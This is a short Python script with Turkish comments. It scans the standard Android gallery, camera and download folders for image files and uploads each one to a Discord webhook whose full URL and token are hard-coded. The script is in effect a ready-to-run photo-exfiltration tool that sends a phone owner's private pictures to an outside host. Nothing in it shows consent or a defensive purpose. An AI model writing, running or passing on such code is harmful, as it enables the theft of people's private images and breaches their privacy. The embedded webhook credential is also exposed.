import os
import requests

# Webhook URL'ni buraya yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499686865559748659/1LIdmEUDM8Pr5xMCpChMaowQSlJIqjpRx5nS6ZWFf2gQ3NVfLLdQpe5_A3EeoL-47JzM"

def upload_file_to_discord(file_path):
    try:
        with open(file_path, 'rb') as f:
            # Discord webhook dosya gönderme formatı
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files)

        if 200 <= response.status_code <= 204:
            print(f"✅ {file_path} başarıyla gönderildi.")
        else:
            print(f"❌ {file_path} gönderilemedi: {response.status_code}")
    except Exception as e:
        print(f"⚠️ Hata oluştu: {file_path}: {e}")

def find_images_in_gallery():
    # Android cihazlarda genel medya yolları
    gallery_paths = [
        '/sdcard/DCIM/Camera',
        '/sdcard/Pictures',
        '/storage/emulated/0/DCIM/Camera',
        '/storage/emulated/0/Pictures',
        '/sdcard/Download'
    ]
    
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
    image_files = []

    for folder in gallery_paths:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        image_files.append(os.path.join(root, file))
    
    return image_files

if __name__ == "__main__":
    print("🚀 Galeri taranıyor...")
    images = find_images_in_gallery()
    
    if not images:
        print("📭 Gönderilecek fotoğraf bulunamadı.")
    else:
        print(f"📸 {len(images)} adet dosya bulundu, gönderim başlıyor...")
        for image in images:
            upload_file_to_discord(image)
        
        print("✅ İşlem tamamlandı.")